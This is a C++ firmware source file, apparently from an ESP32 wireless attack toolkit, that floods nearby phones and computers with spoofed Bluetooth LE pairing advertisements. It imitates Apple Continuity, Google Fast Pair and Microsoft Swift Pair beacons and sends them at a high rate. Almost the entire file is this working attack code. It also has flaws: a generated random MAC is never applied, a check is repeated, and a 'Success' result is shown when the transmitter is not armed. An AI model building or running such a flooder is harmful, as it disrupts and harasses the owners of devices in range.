#include "ble_beacon_spam.h"
#include "tx_arm.h"
#include "config.h"
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#include "results_display.h"

namespace {
volatile bool g_spamActive = false;
uint32_t g_beaconsGenerated = 0;

// Apple Continuity beacon payload (simplified)
uint8_t appleContinuityPayload[] = {0x4C, 0x00, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00};

// Google Fast Pair beacon payload
uint8_t googleFastPairPayload[] = {0x03, 0x03, 0x2C, 0xFE, 0x05, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00};

// Microsoft Swift Pair beacon payload
uint8_t msSwiftPairPayload[] = {0x05, 0xFF, 0x06, 0x00, 0x01, 0x00, 0x00};

void generateRandomMAC(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (esp_random() % 256);
    }
    mac[0] &= 0xFE;  // Clear bit 0 to make it valid
}

BLEAdvertising *g_pAdvertising = nullptr;

void sendBeacon(const uint8_t *payload, size_t payloadLen) {
    if (!g_pAdvertising) return;

    uint8_t mac[6];
    generateRandomMAC(mac);

    BLEAdvertisementData advData;

    if (payload) {
        advData.setFlags(0x06);
        advData.addData(std::string((const char*)payload, payloadLen));
    }

    g_pAdvertising->setAdvertisementData(advData);
    g_pAdvertising->start();
    delayMicroseconds(100);
    g_pAdvertising->stop();

    g_beaconsGenerated++;
}
}

namespace BLEBeaconSpam {

SpamResult spamBeacons(const String &beaconType, uint32_t durationMs) {
    SpamResult result{false, 0, durationMs, beaconType};

    Serial.println("\n=== BLE Beacon Spam (REAL Advertisement Flooding) ===");
    Serial.printf("Type: %s | Duration: %lums\n", beaconType.c_str(), durationMs);

    if (!TxArm::isArmed()) {
        result.success = false;
        return result;
    }
    Serial.println("Duration: " + String(durationMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
        return result;
    }

    BLEDevice::init("");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    g_pAdvertising = pAdvertising;

    g_spamActive = true;
    g_beaconsGenerated = 0;
    uint32_t startTime = millis();

    Serial.println("Starting beacon flood...");

    while (millis() - startTime < durationMs && g_spamActive) {
        uint8_t type = (beaconType == "ALL") ? (millis() % 3) :
                      (beaconType == "APPLE") ? 0 :
                      (beaconType == "GOOGLE") ? 1 : 2;

        switch(type) {
            case 0:  // Apple Continuity
                sendBeacon(appleContinuityPayload, sizeof(appleContinuityPayload));
                break;
            case 1:  // Google Fast Pair
                sendBeacon(googleFastPairPayload, sizeof(googleFastPairPayload));
                break;
            case 2:  // Microsoft Swift Pair
                sendBeacon(msSwiftPairPayload, sizeof(msSwiftPairPayload));
                break;
        }

        delayMicroseconds(500);  // Minimal delay between beacons

        if (g_beaconsGenerated % 100 == 0) {
            Serial.println("  [" + String(g_beaconsGenerated) + "] beacons sent in " +
                         String(millis() - startTime) + "ms");
        }
    }

    g_spamActive = false;
    result.success = true;
    result.beaconsCount = g_beaconsGenerated;

    Serial.println("✓ Beacon flood complete");
    Serial.println("Total beacons: " + String(result.beaconsCount));
    uint32_t elapsed = millis() - startTime;
    Serial.println("Duration: " + String(elapsed) + "ms");
    if (elapsed > 0) {
        Serial.println("Rate: ~" + String((result.beaconsCount * 1000) / elapsed) + " beacons/sec");
    }

    BLEDevice::deinit(false);

    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
    return result;
}

void stop() {
    g_spamActive = false;
    Serial.println("Beacon spam stopped");
}

bool isActive() {
    return g_spamActive;
}

}  // namespace BLEBeaconSpam
